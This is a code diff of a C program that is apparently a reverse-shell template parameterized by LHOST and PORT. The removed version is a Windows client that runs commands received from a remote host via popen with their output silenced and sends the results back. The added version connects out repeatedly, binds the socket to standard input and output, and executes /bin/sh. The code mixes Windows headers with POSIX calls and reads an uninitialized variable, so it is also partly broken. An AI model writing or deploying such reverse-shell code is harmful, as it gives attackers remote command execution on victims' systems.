@@ -1,72 +1,36 @@
-// Client side C/C++ program to demonstrate Socket
-// programming
 #include <stdio.h>
 #include <winsock2.h> 
 #include <stdlib.h>
-//#include <netinet/in.h> 
 #include <string.h>
 #include <ws2tcpip.h>
-//#include <arpa/inet.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <windows.h>
 #include <winsock.h>
 #include <ws2ipdef.h>
 
-char message[10000];
-struct sockaddr_in serv; 
-int fd; 
-int conn; 
-int valread;
-char output;
-char shell[10000];
-char redirect[100] = " > nul 2>&1";
-
-int main(){
+int main(void){
+  
+  int connection_established;
   char ip[] = LHOST;
   int port = PORT;
 
-  fd = socket(AF_INET, SOCK_STREAM, 0);
 
-  serv.sin_family = AF_INET;
-  serv.sin_port = htons(port);
+  struct sockaddr_in sa;
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(port);
+  sa.sin_addr.s_addr = inet_addr(ip);
 
-  inet_pton(AF_INET, ip, &serv.sin_addr); //Binds client to localhost
+  int sockt =  socket(AF_INET, SOCK_STREAM, 0);
+  while(connection_established != 0){
+    connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
+  }
 
-  connect(fd, (struct sockaddr *)&serv, sizeof(serv)); //connects client to server
-  
-  conn = accept(fd, (struct sockaddr *)NULL, NULL);
- 
-  while(1){
-    fflush(stdout);
+	dup2(sockt, 0);
+	dup2(sockt, 1);
+	dup2(sockt, 2);
 
-    valread = read(fd, message, 10000);
-        
-    if(valread > 0){
-      strcat(message, redirect);
-      message[strlen(message)] = ' ';
-
-      FILE *file = popen(message, "r");
-      output = fgetc(file);
-      int i = 0;
-      
-      while (output != EOF){
-        
-        shell[i] = output;
-
-        output = fgetc(file);
-        i++;
-      }
-       
-      send(fd, shell, strlen(shell), 0);
-      for(int i = 0; i < strlen(shell); i++){
-        shell[i] = ' ';
-      }
-      fclose(file);
-    
-    }  
-  
-}
-
-  return 0;
+	char *const argv[] = {"/bin/sh", NULL};
+	execve("/bin/sh", argv, NULL);
+	return 0;
 }
